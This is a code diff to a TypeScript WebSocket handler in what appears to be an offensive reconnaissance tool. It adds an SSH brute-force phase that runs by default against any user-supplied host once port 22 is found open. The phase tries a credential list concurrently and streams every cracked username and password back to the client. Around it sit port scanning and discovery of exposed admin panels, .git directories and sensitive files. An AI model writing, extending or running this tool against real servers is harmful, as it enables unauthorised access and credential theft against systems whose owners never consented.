@@ -1,15 +1,16 @@
 import type { WebSocket } from "ws";
 import { probeTargetEnvironment, probeNetworkServices, probeWebDiscovery } from "../lib/targetProbe.js";
 import { isSelfTarget } from "../lib/bypassEngine.js";
+import { sshBruteForce, SSH_CRED_TOTAL } from "../lib/sshBrute.js";
 import { logger } from "../lib/logger.js";
 import * as dns from "dns";
 import * as net from "net";
 
 const DEFAULT_PROBE_PORTS = [
   21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443, 445,
-  465, 587, 636, 1433, 1521, 2049, 2375, 2376, 2379, 3306,
+  465, 587, 636, 1433, 1521, 1883, 2049, 2375, 2376, 2379, 3306,
   3389, 4444, 5432, 5900, 5984, 5985, 5986, 6379, 6443, 7474,
-  8080, 8443, 8888, 9200, 9300, 10250, 11211, 15672, 27017,
+  8080, 8200, 8443, 8500, 8888, 9090, 9200, 9300, 10250, 11211, 15672, 27017,
 ];
 
 function send(ws: WebSocket, obj: unknown): void {
@@ -47,18 +48,19 @@ function tcpProbe(host: string, port: number, timeoutMs: number): Promise<boolea
 
 export function handleProbeTarget(ws: WebSocket): void {
   ws.once("message", (raw) => {
-    let req: { url?: string; scanPorts?: boolean; ports?: number[] };
+    let req: { url?: string; scanPorts?: boolean; ports?: number[]; sshBrute?: boolean };
     try {
-      req = JSON.parse(raw.toString()) as { url?: string; scanPorts?: boolean; ports?: number[] };
+      req = JSON.parse(raw.toString()) as { url?: string; scanPorts?: boolean; ports?: number[]; sshBrute?: boolean };
     } catch {
       send(ws, { type: "error", message: "invalid JSON" });
       ws.close();
       return;
     }
 
-    const url       = (req.url ?? "").trim();
-    const scanPorts = req.scanPorts !== false;
-    const portList  = Array.isArray(req.ports) && req.ports.length > 0
+    const url        = (req.url ?? "").trim();
+    const scanPorts  = req.scanPorts !== false;
+    const doSshBrute = req.sshBrute !== false;
+    const portList   = Array.isArray(req.ports) && req.ports.length > 0
       ? req.ports.map(Number).filter((p) => p > 0 && p < 65536)
       : DEFAULT_PROBE_PORTS;
 
@@ -82,14 +84,14 @@ export function handleProbeTarget(ws: WebSocket): void {
     }
 
     const hostname = parsed.hostname;
-    logger.info({ url, scanPorts }, "ws/probe start");
+    logger.info({ url, scanPorts, doSshBrute }, "ws/probe start");
 
     let aborted = false;
     ws.on("close", () => { aborted = true; });
 
     void (async () => {
       // ── Phase 1: DNS resolution ──────────────────────────────────────
-      send(ws, { type: "progress", message: `[1/4] Resolving hostname: ${hostname}` });
+      send(ws, { type: "progress", message: `[1/5] Resolving hostname: ${hostname}` });
       const addrs = await dnsResolve(hostname);
       if (aborted) return;
 
@@ -104,13 +106,13 @@ export function handleProbeTarget(ws: WebSocket): void {
       send(ws, { type: "progress", message: `[DNS] Resolved to: ${addrs.slice(0, 4).join(", ")}` });
 
       // ── Phase 2: Quick TCP connectivity check on port 80/443 ────────
-      send(ws, { type: "progress", message: `[2/4] Testing TCP connectivity on port 80 and 443...` });
-      const tcpPort    = parsed.port ? Number(parsed.port) : (parsed.protocol === "https:" ? 443 : 80);
-      const tcpAlive   = await tcpProbe(hostname, tcpPort, 4000);
+      send(ws, { type: "progress", message: `[2/5] Testing TCP connectivity on port 80 and 443...` });
+      const tcpPort  = parsed.port ? Number(parsed.port) : (parsed.protocol === "https:" ? 443 : 80);
+      const tcpAlive = await tcpProbe(hostname, tcpPort, 4000);
       if (aborted) return;
 
       // ── Phase 3: HTTP fingerprinting ─────────────────────────────────
-      send(ws, { type: "progress", message: `[3/4] HTTP fingerprinting: ${url}` });
+      send(ws, { type: "progress", message: `[3/5] HTTP fingerprinting: ${url}` });
 
       let httpReachable = false;
       try {
@@ -157,8 +159,8 @@ export function handleProbeTarget(ws: WebSocket): void {
                 if (webDisc.gitExposed)  discLines.push("  [CRITICAL] /.git/HEAD exposed — source code recoverable via git-dumper");
                 if (webDisc.phpinfo)     discLines.push("  [HIGH] phpinfo() page exposed — reveals server internals");
                 if (webDisc.dirListing)  discLines.push("  [MEDIUM] Directory listing enabled");
-                for (const p of webDisc.adminPanels)    discLines.push(`  [+] Admin panel: ${p.path} (HTTP ${p.status})`);
-                for (const f of webDisc.sensitiveFiles)  discLines.push(`  [!] Sensitive file accessible: ${f.path} (HTTP ${f.status})`);
+                for (const p of webDisc.adminPanels)   discLines.push(`  [+] Admin panel: ${p.path} (HTTP ${p.status})`);
+                for (const f of webDisc.sensitiveFiles) discLines.push(`  [!] Sensitive file accessible: ${f.path} (HTTP ${f.status})`);
                 if (webDisc.robotsTxt) {
                   const disallowed = webDisc.robotsTxt.split("\n")
                     .filter(l => /^Disallow:/i.test(l)).slice(0, 10).map(l => l.trim());
@@ -178,12 +180,14 @@ export function handleProbeTarget(ws: WebSocket): void {
       if (aborted) return;
 
       // ── Phase 4: TCP port scan (always runs as long as DNS resolved) ─
+      let sshOpen = false;
       if (scanPorts) {
-        send(ws, { type: "progress", message: `[4/4] TCP service scan on ${hostname} — ${portList.length} ports` });
+        send(ws, { type: "progress", message: `[4/5] TCP service scan on ${hostname} — ${portList.length} ports` });
         try {
           const services = await probeNetworkServices(hostname, portList, 3000);
           if (!aborted) {
             send(ws, { type: "service_fingerprints", host: hostname, services });
+            sshOpen = services.some(s => s.port === 22);
             if (services.length === 0) {
               send(ws, { type: "progress", message: `── Service Fingerprints ──\n  No open ports found in scanned list` });
             } else {
@@ -198,6 +202,72 @@ export function handleProbeTarget(ws: WebSocket): void {
         } catch (e) {
           send(ws, { type: "progress", message: `[TCP] Scan error: ${(e as Error).message}` });
         }
+      }
+
+      if (aborted) return;
+
+      // ── Phase 5: SSH brute-force (only when port 22 confirmed open) ──
+      if (doSshBrute && sshOpen) {
+        send(ws, {
+          type: "progress",
+          message:
+            `[5/5] SSH brute-force on ${hostname}:22\n` +
+            `      Trying ${SSH_CRED_TOTAL} credential pairs (concurrency=5, timeout=6s/attempt)`,
+        });
+        send(ws, { type: "ssh_brute_start", host: hostname, total: SSH_CRED_TOTAL });
+
+        let lastPct = -1;
+        const results = await sshBruteForce({
+          host:        hostname,
+          port:        22,
+          concurrency: 5,
+          timeoutMs:   6000,
+          stopOnFirst: false,
+          onProgress: (tried, total, found) => {
+            if (aborted) return;
+            const pct = Math.floor((tried / total) * 100);
+            if (pct !== lastPct && (pct % 5 === 0 || found.length > 0)) {
+              lastPct = pct;
+              send(ws, {
+                type:    "ssh_brute_progress",
+                tried,
+                total,
+                pct,
+                found:   found.length,
+              });
+            }
+          },
+          onFound: (hit) => {
+            if (aborted) return;
+            send(ws, {
+              type:     "ssh_brute_found",
+              user:     hit.user,
+              password: hit.password,
+              banner:   hit.banner,
+              host:     hit.host,
+              port:     hit.port,
+            });
+            send(ws, {
+              type:    "progress",
+              message: `[SSH] ✓ CREDENTIAL FOUND: ${hit.user}:${hit.password}${hit.banner ? ` | Banner: ${hit.banner}` : ""}`,
+            });
+          },
+        });
+
+        if (!aborted) {
+          if (results.length === 0) {
+            send(ws, { type: "progress", message: `[SSH] Brute-force complete — no valid credentials from ${SSH_CRED_TOTAL} pairs` });
+          } else {
+            send(ws, {
+              type:    "progress",
+              message: `[SSH] Brute-force complete — ${results.length} credential(s) found:\n` +
+                results.map(r => `  ${r.user}:${r.password}`).join("\n"),
+            });
+          }
+          send(ws, { type: "ssh_brute_end", results });
+        }
+      } else if (doSshBrute && !sshOpen) {
+        send(ws, { type: "progress", message: `[5/5] SSH brute-force skipped — port 22 not open` });
       }
 
       if (aborted) return;
